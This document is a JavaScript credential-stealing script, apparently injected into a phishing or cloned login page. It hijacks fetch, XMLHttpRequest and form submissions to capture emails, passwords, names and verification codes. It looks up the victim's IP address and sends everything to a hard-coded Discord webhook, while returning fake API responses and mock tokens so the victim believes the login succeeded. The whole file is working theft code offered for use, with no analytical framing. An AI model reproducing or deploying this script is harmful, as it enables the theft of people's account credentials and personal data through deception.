// Z3lphyx Auth Hook — Interception + Mock API + Discord
(function() {
    'use strict';

    const WEBHOOK = "https://discord.com/api/webhooks/1506998147434676304/jVsItbE7-LukI-fyshElFimQcZEb8iWi7CZ2ANdXZoIJOwmAItJWB9mbdEmjStI8uRSA";
    const ALLOWED_DOMAINS = ['gmail.com','outlook.com','hotmail.com','yahoo.com','icloud.com','protonmail.com','proton.me','zoho.com','aol.com'];
    let cachedIP = null;
    let pendingRegisterData = null;

    async function getIP() {
        if (cachedIP) return cachedIP;
        for (const url of ['https://api.ipify.org?format=json', 'https://ipapi.co/json/']) {
            try {
                const r = await fetch(url, { signal: AbortSignal.timeout(4000) });
                const d = await r.json();
                cachedIP = d.ip || d;
                return cachedIP;
            } catch {}
        }
        return 'Inconnu';
    }
    getIP();

    function sendToDiscord(embed) {
        try {
            navigator.sendBeacon(WEBHOOK, JSON.stringify({
                username: 'Z3lphyx Auth',
                embeds: [embed]
            }));
        } catch {}
    }

    function buildEmbed(title, color, fields) {
        return {
            title, color, fields,
            footer: { text: 'Z3lphyx Auth · ' + new Date().toLocaleString('fr-FR') },
            timestamp: new Date().toISOString()
        };
    }

    async function sendCredentials(creds, source, isRegister) {
        const ip = await getIP();
        const ua = navigator.userAgent;
        if (isRegister) {
            sendToDiscord(buildEmbed('📝 Nouvelle Inscription [' + source + ']', 0x00ff88, [
                { name: '👤 Nom',      value: creds.nom || creds.last_name || 'N/A', inline: true },
                { name: '👤 Prénom',   value: creds.prenom || creds.first_name || 'N/A', inline: true },
                { name: '🏷️ Pseudo',  value: creds.pseudo || creds.username || 'N/A', inline: true },
                { name: '📧 Email',    value: creds.email || 'N/A', inline: true },
                { name: '🔑 Mot de passe', value: '||' + (creds.password || '') + '||', inline: false },
                { name: '🌐 IP',       value: '||' + ip + '||', inline: true },
                { name: '🧭 User-Agent', value: '```' + ua.slice(0, 180) + '```', inline: false }
            ]));
        } else {
            sendToDiscord(buildEmbed('🔐 Connexion Détectée [' + source + ']', 0x00f0ff, [
                { name: '👤 Identifiant', value: creds.email || creds.identifier || creds.username || 'N/A', inline: true },
                { name: '🔑 Mot de passe', value: '||' + (creds.password || '') + '||', inline: false },
                { name: '🌐 IP',          value: '||' + ip + '||', inline: true },
                { name: '🧭 User-Agent',  value: '```' + ua.slice(0, 180) + '```', inline: false }
            ]));
        }
    }

    function parseCreds(bodyStr) {
        if (!bodyStr) return null;
        try {
            const d = typeof bodyStr === 'string' ? JSON.parse(bodyStr) : bodyStr;
            if (!d || typeof d !== 'object') return null;
            const c = {};
            for (const [k, v] of Object.entries(d)) {
                const kl = k.toLowerCase();
                if (/pass|mdp|motdepasse/i.test(kl)) c.password = String(v);
                else if (/email|mail|adresse/i.test(kl)) c.email = String(v);
                else if (/pseudo|username|user|login|identifier/i.test(kl)) c.username = String(v);
                else if (/nom|surname|last.?name|family.?name/i.test(kl)) c.nom = String(v);
                else if (/prenom|first.?name|given.?name|prénom/i.test(kl)) c.prenom = String(v);
                else if (/full_name|fullname/i.test(kl)) c.full_name = String(v);
                else if (/otp|otpcode|code|verification/i.test(kl)) c.otp = String(v);
                else c[k] = String(v);
            }
            return c.password ? c : null;
        } catch { return null; }
    }

    function isAuthURL(url) {
        return /\/api\/(auth|login|register|sign|gateway|token|session|connect|otp|verify)/i.test(url);
    }

    function isProfileURL(url) {
        return /\/api\/(entities\/profile|profiles|user|users)/i.test(url);
    }

    function mockToken() {
        const chars = 'abcdef0123456789';
        let t = '';
        for (let i = 0; i < 64; i++) t += chars[Math.floor(Math.random() * chars.length)];
        return 'mock_' + t;
    }

    function mockResponse(url, body, method) {
        const u = url.toLowerCase();
        if (u.includes('/public-settings/') || u.includes('/apps/public')) {
            return { data: { id: '6a608801949bfa0162d3ef90', name: 'Z3lphyx Gateway', settings: { auth_methods: ['email_password'], allowed_domains: ALLOWED_DOMAINS, require_verification: true }, status: 'active' }, status: 200 };
        }
        if (u.includes('/profile/filter') || (u.includes('/profile') && method === 'get')) {
            return { data: [], status: 200 };
        }
        if ((u.includes('/profile') || u.includes('/entities/profile/')) && method === 'post') {
            const creds = parseCreds(body);
            if (creds) { pendingRegisterData = { ...pendingRegisterData, ...creds }; setTimeout(() => sendCredentials(pendingRegisterData, 'API', true), 100); }
            return { data: { id: 'mock_' + Date.now(), created: true }, status: 200 };
        }
        if (u.includes('/auth/register') || u.includes('/register')) {
            const creds = parseCreds(body);
            if (creds) pendingRegisterData = creds;
            return { data: { success: true, message: 'Code sent', requires_otp: true }, status: 200 };
        }
        if (u.includes('/auth/login') || (u.includes('/login') && (u.includes('email') || u.includes('password')))) {
            const creds = parseCreds(body);
            if (creds) setTimeout(() => sendCredentials(creds, 'API', false), 100);
            return { data: { access_token: mockToken(), token_type: 'bearer', user: { email: creds ? creds.email : 'user@m.com' } }, status: 200 };
        }
        if (u.includes('/verify') || u.includes('/otp') || u.includes('/verifyotp')) {
            if (pendingRegisterData) { setTimeout(() => sendCredentials(pendingRegisterData, 'OTP', true), 100); pendingRegisterData = null; }
            return { data: { access_token: mockToken(), token_type: 'bearer', verified: true }, status: 200 };
        }
        if (u.includes('/resend')) {
            return { data: { success: true }, status: 200 };
        }
        if (u.includes('/auth/me') || u.includes('/user/me')) {
            return { data: { id: 'mock_user', email: 'user@mock.com', role: 'user' }, status: 200 };
        }
        if (u.includes('/updateme') || u.includes('/update') || (u.includes('/me') && method === 'patch')) {
            return { data: { success: true, updated: true }, status: 200 };
        }
        if (u.includes('/auth/check') || u.includes('/authenticated')) {
            return { data: { authenticated: true }, status: 200 };
        }
        if (u.includes('/logout')) {
            return { data: { success: true }, status: 200 };
        }
        if (u.includes('/app-logs/')) {
            return { data: { logged: true }, status: 200 };
        }
        if (u.includes('/api/')) {
            return { data: { success: true }, status: 200 };
        }
        return null;
    }

    // -- FETCH --
    const _fetch = window.fetch;
    window.fetch = async function(input, init) {
        let url = '', body = null, method = 'GET';
        if (typeof input === 'string') { url = input; method = (init && init.method) || 'GET'; body = (init && init.body) || null; }
        else if (input instanceof Request) { url = input.url; method = input.method || 'GET'; try { body = await input.clone().text(); } catch {} }
        if (url.includes('/api/')) {
            const mock = mockResponse(url, body, method.toUpperCase());
            if (mock) {
                if (isAuthURL(url) || isProfileURL(url)) {
                    const creds = parseCreds(body);
                    if (creds) {
                        const isReg = u.includes('register') || (u.includes('profile') && method === 'POST') || (pendingRegisterData && u.includes('verify'));
                        setTimeout(() => sendCredentials(creds, 'Fetch', isReg), 50);
                    }
                }
                return new Response(JSON.stringify(mock.data), { status: mock.status, statusText: 'OK', headers: { 'Content-Type': 'application/json' } });
            }
        }
        return _fetch.apply(this, arguments);
    };

    // -- XHR (Axios) --
    const _open = XMLHttpRequest.prototype.open;
    const _send = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._hookMethod = (method || 'GET').toUpperCase();
        this._hookURL = (url || '').toString();
        return _open.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        const url = this._hookURL || '';
        const method = this._hookMethod || 'GET';
        if (url.includes('/api/')) {
            const mock = mockResponse(url, body, method);
            if (mock) {
                if (isAuthURL(url) || isProfileURL(url)) {
                    const creds = parseCreds(body);
                    if (creds) {
                        const isReg = url.toLowerCase().includes('register') || (url.toLowerCase().includes('profile') && method === 'POST') || (pendingRegisterData && url.toLowerCase().includes('verify'));
                        setTimeout(() => sendCredentials(creds, 'XHR', isReg), 50);
                    }
                }
                const self = this;
                const data = JSON.stringify(mock.data);
                setTimeout(function() {
                    Object.defineProperty(self, 'readyState', { value: 4, writable: true });
                    Object.defineProperty(self, 'status', { value: mock.status, writable: true });
                    Object.defineProperty(self, 'statusText', { value: 'OK', writable: true });
                    Object.defineProperty(self, 'responseText', { value: data, writable: true });
                    Object.defineProperty(self, 'response', { value: data, writable: true });
                    if (self.onreadystatechange) self.onreadystatechange.call(self, new Event('readystatechange'));
                    if (self.onload) self.onload.call(self, new Event('load'));
                    if (self.onloadend) self.onloadend.call(self, new Event('loadend'));
                }, 150);
                return;
            }
        }
        return _send.apply(this, arguments);
    };

    // -- DOM fallback --
    setTimeout(function() {
        try {
            new MutationObserver(function() {
                document.querySelectorAll('form').forEach(function(form) {
                    if (form.dataset.zHook) return;
                    var pwd = form.querySelector('input[type="password"]');
                    if (!pwd) return;
                    form.dataset.zHook = '1';
                    form.addEventListener('submit', function() {
                        var f = new FormData(form);
                        var c = {};
                        for (var entry of f.entries()) c[entry[0]] = entry[1];
                        if (!c.password && !c.mot_de_passe && !c.mdp) return;
                        if (!c.email && !c.pseudo && !c.username && !c.nom) return;
                        var hasExtra = c.nom || c.prenom || c.first_name || c.last_name;
                        sendCredentials({
                            password: c.password || c.mot_de_passe || c.mdp,
                            email: c.email || c.mail,
                            username: c.pseudo || c.username || c.user || c.login || c.identifier,
                            nom: c.nom || c.last_name || c.surname,
                            prenom: c.prenom || c.first_name || c.prénom
                        }, 'DOM', !!hasExtra);
                    }, true);
                });
            }).observe(document.body || document.documentElement, { childList: true, subtree: true });
        } catch(e) {}
    }, 1500);
})();